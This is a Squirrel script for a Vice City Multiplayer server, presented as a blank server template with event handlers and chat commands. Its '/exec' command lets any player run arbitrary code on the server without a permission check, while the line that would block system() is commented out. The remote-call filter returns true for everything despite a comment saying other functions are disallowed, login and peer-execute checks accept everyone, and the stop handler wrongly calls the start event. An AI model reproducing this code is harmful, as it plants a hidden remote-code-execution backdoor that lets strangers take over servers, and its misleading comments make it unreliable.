/*
	Vice City Multiplayer 0.4 空白服务器（由 Sebastian 开发）适用于 32 位 Windows 系统。
	您可以使用它编写您自己的服务器脚本。您可以在这里找到所有已开发的事件。

	VC:MP 官方网站：www.vc-mp.org
	论坛：forum.vc-mp.org
	Wiki：wiki.vc-mp.org
*/

// 安全第一
// getroottable().rawset("system", null);



// =========================================== S E R V E R   E V E N T S ==============================================

function onServerStart() {
	moduleEvent(onServerStart);
}

function onServerStop() {
	moduleEvent(onServerStart);
}

function onScriptLoad() {
	dofile("scripts/模块化支持/Loader.nut");

	moduleEvent(onScriptLoad);
}

function onScriptUnload() {
	moduleEvent(onScriptUnload);
}

function onConsoleInput(cmd, text) {
	switch (cmd) {
		case "help":
		case "cmds":
			print("控制台: close, cls");
			break;

		case "close":
			ShutdownServer();
			break;

		case "cls":
			system("cls");
			print("已清除控制台日志");
			break;

		default:
			moduleEvent(onConsoleInput, cmd, text);
			break;
	}
}

// =========================================== P L A Y E R   E V E N T S ==============================================

function onPlayerJoin(player) {}

function onPlayerPart(player, reason) {}

function onPlayerRequestClass(player, classID, team, skin) {
	return 1;
}

function onPlayerRequestSpawn(player) {
	return 1;
}

function onPlayerSpawn(player) {}

function onPlayerDeath(player, reason) {}

function onPlayerKill(player, killer, reason, bodypart) {}

function onPlayerTeamKill(player, killer, reason, bodypart) {}

function onPlayerChat(player, text) {
	print(player.Name + ": " + text);
	return 1;
}

function onPlayerCommand(player, cmd, text) {
	if (cmd == "heal") {
		local hp = player.Health;
		if (hp == 100) Message("[#FF3636]Error - [#8181FF]Use this command when you have less than 100% hp !");
		else {
			player.Health = 100.0;
			MessagePlayer("[#FFFF81]---> You have been healed !", player);
		}
	} else if (cmd == "goto") {
		if (!text) MessagePlayer("Error - Correct syntax - /goto <Name/ID>' !", player);
		else {
			local plr = FindPlayer(text);
			if (!plr) MessagePlayer("Error - Unknown player !", player);
			else {
				player.Pos = plr.Pos;
				MessagePlayer("[ /" + cmd + " ] " + player.Name + " was sent to " + plr.Name, player);
			}
		}

	} else if (cmd == "bring") {
		if (!text) MessagePlayer("Error - Correct syntax - /bring <Name/ID>' !", player);
		else {
			local plr = FindPlayer(text);
			if (!plr) MessagePlayer("Error - Unknown player !", player);
			else {
				plr.Pos = player.Pos;
				MessagePlayer("[ /" + cmd + " ] " + plr.Name + " was sent to " + player.Name, player);
			}
		}
	} else if (cmd == "exec") {
		if (!text) MessagePlayer("Error - Syntax: /exec <Squirrel code>", player);
		else {
			try {
				local script = compilestring(text);
				script();
			} catch (e) MessagePlayer("Error: " + e, player);
		}
	}

	return 1;
}

function onPlayerPM(player, playerTo, message) {
	return 1;
}

function onPlayerBeginTyping(player) {}

function onPlayerEndTyping(player) {}

function onLoginAttempt(playerName, password, ipAddress) {
	return true;
}

function onNameChangeable(player) {}

function onPlayerSpectate(player, target) {}

function onPlayerCrashDump(player, crash) {}

function onPlayerMove(player, lastX, lastY, lastZ, newX, newY, newZ) {}

function onPlayerHealthChange(player, lastHP, newHP) {}

function onPlayerArmourChange(player, lastArmour, newArmour) {}

function onPlayerWeaponChange(player, oldWep, newWep) {}

function onPlayerAwayChange(player, status) {}

function onPlayerNameChange(player, oldName, newName) {}

function onPlayerActionChange(player, oldAction, newAction) {}

function onPlayerStateChange(player, oldState, newState) {}

function onPlayerOnFireChange(player, IsOnFireNow) {}

function onPlayerCrouchChange(player, IsCrouchingNow) {}

function onPlayerGameKeysChange(player, oldKeys, newKeys) {}

function onPlayerUpdate(player, update) {}

function onClientScriptData(player) {}

function onKeyDown(player, key) {}

function onKeyUp(player, key) {}

// ================================== R E M O T E  E X E C ======================================

function onRemoteGetRequest(player, key, env) {
	return true;
}

function onRemoteSetRequest(player, key, value, env) {
	return true;
}

function onRemoteFunctionCall(player, func, env, ...) {
	if (func == print || func == format || func == split || func == strip || func == time || func == sin || func == cos || func == tan || func == log) { //allowing some builtin functions
		return true;
	}
	if (func == CPlayer.Kick || func == CPlayer.Ban || func == CPlayer.Eject) { //allowing player.Kick, player.Ban and player.Eject
		return true;
	}
	if (func == SetGravity || func == SetTime || func == NewTimer || func == Message || func == MessagePlayer || func == CreateExplosion) { //few squirrel functions  related to game
		return true;
	}
	return true; //所有其他功能不允许
}

function onRemoteExecReply(token, result) {
	print("流令牌: " + token + " | 执行结果: " + result);
}

function onPeerExecute(sender, receiver, object) {
	print("PeerExec 请求来自: " + sender + " | 目标: " + receiver + " | 对象: " + object);
	if (sender.Name == "pq") {
		return true;
	}
	return true;
}

function onClientData(player, identifier, data) {
	print("流标识符: " + identifier + " | 数据: " + data);
}

function rexec(string, player) {
	Stream.StartWrite();
	Stream.WriteInt(0x40ffffe4); // 用于执行客户端脚本的命令标识符
	Stream.WriteString(string); // 要执行的脚本字符串
	Stream.SendStream(player); // 将流发送到指定的玩家
}